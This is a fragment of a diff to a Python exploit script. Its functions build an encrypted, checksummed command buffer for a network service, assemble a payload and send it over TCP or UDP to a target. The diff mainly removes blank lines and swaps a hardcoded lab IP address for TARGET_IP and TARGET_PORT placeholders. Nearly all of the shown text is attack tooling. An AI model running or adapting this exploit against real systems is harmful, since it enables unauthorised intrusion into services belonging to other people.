 def build_command_header(SZ) -> bytes:
     sz = struct.pack("<L", SZ)
@@ -362,7 +824,6 @@ def get_payload_sz(cb_command_buffer):
 
     return sz
 
-
 def build_command_buffer(ps_command_agent: bytes, buffer: bytes, cb_command_buffer) -> bytes:
     buffer_list = list(buffer[4:])
     cbuf_checksum = ps_command_buffer_checksum(buffer_list, cb_command_buffer - 4)
@@ -375,7 +836,6 @@ def build_command_buffer(ps_command_agent: bytes, buffer: bytes, cb_command_buff
         print(f"checkvalue: {hex(cbuf_checksum)}")
 
     return ps_command_agent + ps_command_buffer
-
 
 def build_command_agent(sz_payload, cb_command_buffer) -> bytes:
     encode = struct.pack("<L", 0x010795ef) # checksum needed by second encryption
@@ -391,7 +851,6 @@ def build_command_agent(sz_payload, cb_command_buffer) -> bytes:
         print("end: ps_command_agent\n")
 
     return ps_command_agent
-
 
 def phase_one_encryption(ps_command_buffer) -> bytes:
     buf = ps_command_buffer[4:]
@@ -448,12 +907,10 @@ def build_payload():
 
     return payload
 
-
 def tcp_recv(client: socket):
     response = client.recv(4096) 
     print('[*] response:\n')
     print(response.hex())
-
 
 def send_exploit(buffer: bytes, target_host, target_port, udp = False):
 
@@ -486,7 +943,6 @@ def send_exploit(buffer: bytes, target_host, target_port, udp = False):
         client.send(buffer)
         # tcp_recv(client)
 
-
 def print_debug(ENCRYPTED):
     count = 0
     for i in ENCRYPTED:
@@ -502,10 +958,9 @@ def print_debug(ENCRYPTED):
             print("", end = " ")
     print("...")
 
-
 def main():
-    ip = '192.168.182.10'
-    port = 7725
+    ip = TARGET_IP 
+    port = TARGET_PORT 
 
     payload = build_payload()
     send_exploit(payload, ip, port, False)
